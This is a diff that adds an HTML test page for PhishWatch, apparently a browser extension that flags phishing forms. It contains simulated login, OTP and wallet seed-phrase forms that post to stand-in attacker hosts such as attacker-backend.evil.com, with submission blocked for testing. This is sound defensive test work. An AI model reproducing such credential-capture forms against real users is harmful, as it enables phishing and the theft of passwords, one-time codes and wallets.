@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PhishWatch Phase 4 Test - AiTM Pattern Detection</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 24px;
+      background: #0a0a0a;
+      color: #e5e5e5;
+    }
+    h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 12px; }
+    h2 { color: #888; margin-top: 32px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+    
+    .test-section {
+      background: #161616;
+      border: 1px solid #2a2a2a;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 16px 0;
+    }
+    .test-section h3 {
+      margin: 0 0 8px 0;
+      color: #fff;
+    }
+    .test-section p {
+      margin: 0 0 16px 0;
+      color: #888;
+      font-size: 14px;
+    }
+    
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+      margin-left: 8px;
+    }
+    .badge-research { background: #1a1a2e; color: #7c3aed; }
+    .badge-should-trigger { background: #1a2e1a; color: #22c55e; }
+    .badge-should-not { background: #2e1a1a; color: #ef4444; }
+    
+    form {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 12px 0;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #aaa;
+      font-size: 13px;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background: #0a0a0a;
+      color: #fff;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #7c3aed;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      background: #7c3aed;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button:hover { background: #6d28d9; }
+    
+    .console-hint {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-family: monospace;
+      font-size: 13px;
+      color: #58a6ff;
+      margin: 16px 0;
+    }
+    
+    .info-box {
+      background: #1a1a2e;
+      border: 1px solid #312e81;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 16px 0;
+    }
+    .info-box h4 {
+      margin: 0 0 8px 0;
+      color: #a78bfa;
+    }
+    .info-box ul {
+      margin: 0;
+      padding-left: 20px;
+      color: #888;
+    }
+    .info-box li { margin: 4px 0; }
+    
+    .action-display {
+      font-family: monospace;
+      background: #0a0a0a;
+      padding: 8px 12px;
+      border-radius: 6px;
+      color: #22c55e;
+      margin-top: 8px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔬 PhishWatch Phase 4 Test Suite</h1>
+  <p>Testing Adaptive Runtime Intelligence - Form Action Mismatch & Sequence Detection</p>
+  
+  <div class="console-hint">
+    📋 Open DevTools Console (F12) to see <code>[PhishWatch:Research]</code> signals
+  </div>
+  
+  <div class="info-box">
+    <h4>What Phase 4 Detects</h4>
+    <ul>
+      <li><strong>Form-Action Mismatch:</strong> Form POST target differs from page origin</li>
+      <li><strong>Sequence Anomalies:</strong> Unusual patterns during credential entry</li>
+      <li><strong>AiTM Correlation:</strong> Form mismatch + cross-origin network activity</li>
+    </ul>
+    <p style="margin-top: 12px; color: #888;">All Phase 4 signals are <strong>research-only</strong> — logged to console but NOT shown in overlay.</p>
+  </div>
+
+  <h2>Test 1: Form Action Mismatch (SHOULD TRIGGER)</h2>
+  <div class="test-section">
+    <h3>Simulated AiTM Proxy Login <span class="badge badge-should-trigger">Should Trigger</span></h3>
+    <p>This form's action points to a different origin than this page, simulating an AiTM reverse proxy attack.</p>
+    
+    <!-- Form action points to different origin -->
+    <form id="aitm-form" action="https://attacker-backend.evil.com/capture" method="POST">
+      <label>Email</label>
+      <input type="email" name="email" placeholder="victim@company.com">
+      
+      <label>Password</label>
+      <input type="password" name="password" placeholder="Enter password">
+      
+      <button type="submit">Sign In</button>
+      <div class="action-display">Form action: https://attacker-backend.evil.com/capture</div>
+    </form>
+    
+    <p><strong>Expected:</strong> <code>form_action_origin_mismatch</code> signal when focusing password field</p>
+  </div>
+
+  <h2>Test 2: Same-Site Auth (Should NOT Trigger)</h2>
+  <div class="test-section">
+    <h3>Legitimate Cross-Origin SSO <span class="badge badge-should-not">Should NOT Trigger</span></h3>
+    <p>This form posts to a subdomain of the same site — this is normal for SSO flows.</p>
+    
+    <!-- Form action is same-site (different subdomain) -->
+    <form id="sso-form" action="https://auth.example.com/login" method="POST">
+      <label>Username</label>
+      <input type="text" name="username" placeholder="user@example.com">
+      
+      <label>Password</label>
+      <input type="password" name="password" placeholder="Enter password">
+      
+      <button type="submit">Sign In with SSO</button>
+      <div class="action-display">Form action: https://auth.example.com/login (same site)</div>
+    </form>
+    
+    <p><strong>Expected:</strong> No signal (same registrable domain)</p>
+  </div>
+
+  <h2>Test 3: Trusted Auth Provider (Should NOT Trigger)</h2>
+  <div class="test-section">
+    <h3>Google OAuth Login <span class="badge badge-should-not">Should NOT Trigger</span></h3>
+    <p>This form posts to Google's auth endpoint — a trusted identity provider.</p>
+    
+    <!-- Form action is trusted auth domain -->
+    <form id="google-form" action="https://accounts.google.com/signin" method="POST">
+      <label>Email</label>
+      <input type="email" name="email" placeholder="user@gmail.com">
+      
+      <label>Password</label>
+      <input type="password" name="password" placeholder="Enter password">
+      
+      <button type="submit">Sign In with Google</button>
+      <div class="action-display">Form action: https://accounts.google.com/signin (trusted)</div>
+    </form>
+    
+    <p><strong>Expected:</strong> No signal (trusted auth provider)</p>
+  </div>
+
+  <h2>Test 4: OTP/2FA Field Detection</h2>
+  <div class="test-section">
+    <h3>MFA Code Entry <span class="badge badge-research">Research Signal</span></h3>
+    <p>Tests detection of OTP/verification code fields (AiTM attacks often target these).</p>
+    
+    <form id="otp-form" action="https://suspicious-verify.xyz/code" method="POST">
+      <label>Enter verification code</label>
+      <input type="text" name="otp_code" id="verification-code" placeholder="123456" autocomplete="one-time-code">
+      
+      <button type="submit">Verify</button>
+      <div class="action-display">Form action: https://suspicious-verify.xyz/code</div>
+    </form>
+    
+    <p><strong>Expected:</strong> <code>form_action_origin_mismatch</code> signal (OTP field detected as credential)</p>
+  </div>
+
+  <h2>Test 5: Same-Origin Form (Should NOT Trigger)</h2>
+  <div class="test-section">
+    <h3>Normal Login Form <span class="badge badge-should-not">Should NOT Trigger</span></h3>
+    <p>This form's action is the same origin as the page — completely normal.</p>
+    
+    <!-- Form action is same origin -->
+    <form id="normal-form" action="/api/login" method="POST">
+      <label>Email</label>
+      <input type="email" name="email" placeholder="user@company.com">
+      
+      <label>Password</label>
+      <input type="password" name="password" placeholder="Enter password">
+      
+      <button type="submit">Sign In</button>
+      <div class="action-display">Form action: /api/login (same origin)</div>
+    </form>
+    
+    <p><strong>Expected:</strong> No signal (same origin)</p>
+  </div>
+
+  <h2>Test 6: Crypto Seed Phrase Detection</h2>
+  <div class="test-section">
+    <h3>Wallet Recovery (Phishing Simulation) <span class="badge badge-should-trigger">Should Trigger</span></h3>
+    <p>Tests detection of crypto seed phrase fields — commonly targeted by phishing.</p>
+    
+    <form id="seed-form" action="https://wallet-recovery.scam.xyz/import" method="POST">
+      <label>Enter your recovery phrase</label>
+      <input type="text" name="seed_phrase" id="recovery-phrase" placeholder="word1 word2 word3 ...">
+      
+      <button type="submit">Recover Wallet</button>
+      <div class="action-display">Form action: https://wallet-recovery.scam.xyz/import</div>
+    </form>
+    
+    <p><strong>Expected:</strong> <code>form_action_origin_mismatch</code> signal (seed phrase field detected)</p>
+  </div>
+
+  <hr style="border-color: #333; margin: 40px 0;">
+  
+  <h2>How to Test</h2>
+  <div class="info-box">
+    <h4>Testing Steps</h4>
+    <ol style="color: #888; padding-left: 20px;">
+      <li>Open DevTools Console (F12)</li>
+      <li>Filter by <code>[PhishWatch</code> to see all logs</li>
+      <li>Click into password/credential fields in each form</li>
+      <li>Watch for <code>[PhishWatch:Research] form_action_origin_mismatch</code> signals</li>
+      <li>Try submitting forms (they won't actually submit)</li>
+    </ol>
+  </div>
+  
+  <div class="info-box">
+    <h4>Expected Console Output</h4>
+    <pre style="color: #58a6ff; margin: 0;">
+[PhishWatch] content.js loaded (Phase 4 v1 - Adaptive Runtime Intelligence)
+[PhishWatch] navigation context initialized
+[PhishWatch] credential field focus detected (Phase 4)
+[PhishWatch] form action analysis { ... }
+[PhishWatch:Research] form_action_origin_mismatch { ... }
+[PhishWatch] treadmill: armed (Phase 4)
+    </pre>
+  </div>
+
+  <script>
+    // Prevent actual form submissions for testing
+    document.querySelectorAll('form').forEach(function(form) {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        console.log('[Test Page] Form submission prevented:', form.id);
+        console.log('[Test Page] Form action was:', form.action);
+        alert('Form submission intercepted for testing.\n\nCheck console for PhishWatch signals.');
+      });
+    });
+    
+    console.log('[Test Page] Phase 4 test page loaded');
+    console.log('[Test Page] Filter console by "[PhishWatch" to see extension logs');
+  </script>
+</body>
+</html>
